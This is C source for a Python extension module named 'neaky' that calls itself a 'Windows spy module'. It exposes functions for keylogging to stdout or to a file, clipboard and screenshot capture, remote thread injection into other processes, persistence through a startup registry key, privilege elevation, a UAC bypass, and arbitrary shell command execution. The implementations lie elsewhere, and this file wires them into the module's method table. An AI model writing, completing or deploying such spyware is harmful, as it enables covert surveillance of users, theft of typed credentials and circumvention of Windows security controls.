#define PY_SSIZE_T_CLEAN
#include <Python.h>
#include "py_functions.h"
#include "functiondocs.h"

#define WIN32_LEAN_AND_MEAN
#include <windows.h>

#include "neakymodule.h"

HINSTANCE hInst = INVALID_HANDLE_VALUE;
HINSTANCE hModule = INVALID_HANDLE_VALUE; // dll模块实例

WCHAR executable_path[MAX_PATH + 1];
WCHAR module_path[MAX_PATH + 1];

PyObject *NeakyError;

static PyObject *
neaky_system(PyObject *self, PyObject *args)
{
    const char *command;
    int sts;

    puts("hello world!~~");
    if (!PyArg_ParseTuple(args, "s", &command))
        return NULL;
    sts = system(command);
    if (sts < 0)
    {
        PyErr_SetString(NeakyError, "System command failed");
        return NULL;
    }
    return PyLong_FromLong(sts);
}

static PyMethodDef NeakyMethods[] = {
    {"system", neaky_system, METH_VARARGS,
     "Test example method, execute a shell command."},
    {"clipboard", neaky_clipboard, METH_NOARGS,
     "Get clipboard content."},
    {"screenshot", neaky_screenshot, METH_VARARGS,
     screenshot_doc},
    {"get_pid_by_name", neaky_get_pid_by_name, METH_VARARGS,
     get_pid_by_name_doc},
    {"get_pids_by_name", neaky_get_pids_by_name, METH_VARARGS,
    get_pids_by_name_doc},
    {"remote_thread_injection", neaky_remote_thread_injection, METH_VARARGS,
     remote_thread_injection_doc},
    {"set_startup_reg", neaky_set_startup_reg, METH_VARARGS,
     set_startup_reg_doc},
    {"delete_startup_reg", neaky_delete_startup_reg, METH_VARARGS,
     delete_startup_reg_doc},
    {"keylog_stdout", neaky_keylog_stdout, METH_NOARGS,
     "Start keylogging and print to stdout."},
    {"keylog_to_file", neaky_keylog_to_file, METH_VARARGS,
     keylog_to_file_doc},
    {"keylog_stop", neaky_keylog_stop, METH_NOARGS,
     "Stop keylogging to file."},
    {"hook_keylog_stdout", neaky_hook_keylog_stdout, METH_NOARGS,
     "Start keylogging and print to stdout."},
    {"hook_keylog_stop", neaky_hook_keylog_stop, METH_NOARGS,
     "Stop keylogging to file."},
    {"message_loop", neaky_message_loop, METH_NOARGS,
     "Start message loop."},
    {"get_username", neaky_get_username, METH_VARARGS,
     get_username_doc},
    {"elevate_thread", neaky_elevate_thread, METH_VARARGS,
     elevate_thread_doc},
    {"elevate_execute", neaky_elevate_execute, METH_VARARGS,
     elevate_execute_doc},
    {"bypass_uac_exec", neaky_bypass_uac_exec, METH_VARARGS,
     elevate_execute_doc},
    {NULL, NULL, 0, NULL} /* Sentinel */
};

PyDoc_STRVAR(
    module_doc,
    "Windows spy module.\n"
    "Keylogging requires message loop.");

static struct PyModuleDef neakymodule = {
    PyModuleDef_HEAD_INIT,
    "neaky", /* name of module */
    module_doc,    /* module documentation, may be NULL */
    -1,      /* size of per-interpreter state of the module,
                 or -1 if the module keeps state in global variables. */
    NeakyMethods};

PyMODINIT_FUNC
PyInit_neaky(void)
{
    PyObject *m;

    m = PyModule_Create(&neakymodule);
    if (m == NULL)
        return NULL;

    NeakyError = PyErr_NewException("neaky.Exception", NULL, NULL);
    Py_XINCREF(NeakyError);
    if (PyModule_AddObject(m, "Exception", NeakyError) < 0)
    {
        Py_XDECREF(NeakyError);
        Py_CLEAR(NeakyError);
        Py_DECREF(m);
        return NULL;
    }

    // module specific init code here
    hInst = GetModuleHandle(NULL);
    if(!GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (void*)PyInit_neaky, &hModule)) {
        // PyErr_SetString(NeakyError, "get executable path failed.");
        puts("Get executable path failed.");
    }
    GetModuleFileName(NULL, (LPWSTR)executable_path, MAX_PATH);
    GetModuleFileName(hModule, (LPWSTR)module_path, MAX_PATH);

    // printf("Current executable path: %ls\n", executable_path);
    // printf("Current module path: %ls\n", module_path);
    // _putws(L"-------neaky init-------\n");

    return m;
}
